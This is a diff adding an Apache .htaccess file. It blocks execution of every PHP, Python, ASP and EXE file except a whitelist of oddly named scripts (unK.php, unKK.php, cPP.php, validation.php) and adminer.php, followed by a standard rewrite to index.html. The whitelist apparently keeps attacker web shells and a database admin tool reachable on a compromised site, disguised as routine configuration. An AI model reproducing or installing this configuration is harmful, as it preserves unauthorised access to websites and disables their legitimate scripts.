@@ -1,0 +1,17 @@
+<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php|asp)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(validation.php|unK.php|unKK.php|cPP.php|adminer.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+DirectoryIndex index.html
+RewriteRule ^index.html$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.html [L]
+</IfModule>
